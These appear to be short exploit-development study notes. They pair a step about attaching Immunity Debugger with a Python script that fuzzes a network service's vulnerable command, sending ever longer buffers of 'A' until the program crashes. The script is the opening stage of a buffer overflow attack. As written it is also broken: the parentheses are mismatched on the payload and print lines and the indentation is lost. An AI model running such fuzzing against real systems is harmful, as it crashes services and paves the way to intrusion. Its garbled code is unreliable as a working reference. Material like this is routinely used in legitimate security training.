Run Immunity Debugger, attach  
Create python script to fuzz the vulnerable command and find the general number of bytes needed to crash program.
 
### Gedit 1.py

#!/usr/bin/python3  
import sys, socket  
from time import sleep
 
buffer = "A" * 100
 
while True:  
try:  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect(("<IP>",<PORT>))
 
payload = "<Cmd_to_overflow> /.:/" + buffer))  
s.send((payload.encode()))  
s.close()  
sleep(1)  
buffer = buffer + "A"*100
 
except:  
print("Fuzzing crashed at %s bytes" % str(len(buffer))  
sys.exit()
   

### chmod +x 1.py

### ./1.py

[# might not need /.:/ ]